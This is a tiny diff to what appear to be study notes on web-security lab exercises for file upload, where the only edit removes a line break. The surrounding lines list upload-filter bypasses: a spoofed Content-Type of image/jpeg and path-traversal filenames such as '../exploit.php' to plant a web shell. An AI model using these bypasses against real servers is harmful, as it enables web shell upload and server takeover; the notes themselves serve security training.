@@ -25,7 +25,7 @@
   
 **Lab: Web shell upload via Content-Type restriction bypass**
 - change Content-Type : image/jpeg
-<br>
+
 **Lab: Web shell upload via path traversal**
 - Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
 - filename="..%2fexploit.php"
